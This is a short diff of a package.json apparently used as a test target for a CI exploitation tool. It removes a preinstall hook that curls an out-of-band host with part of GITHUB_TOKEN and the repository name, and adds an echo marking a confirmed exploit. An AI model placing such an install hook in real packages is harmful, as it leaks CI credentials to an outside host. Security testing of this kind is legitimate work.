@@ -1,9 +1,8 @@
 {
-  "name": "target",
+  "name": "hydra-e2e-target",
   "version": "1.0.0",
-  "description": "",
   "scripts": {
-    "preinstall": "curl -s 'https://d6er41f3rtnmju0eqrb0qsi1p73au4z4k.oast.pro?t=$(printf '%s' \"${GITHUB_TOKEN:0:8}\" | base64)&r=${GITHUB_REPOSITORY}' -o /dev/null",
-    "test": "echo test passed"
+    "pretest": "echo HYDRA_EXPLOIT_CONFIRMED_E2E-REAL",
+    "test": "echo CI passed"
   }
 }
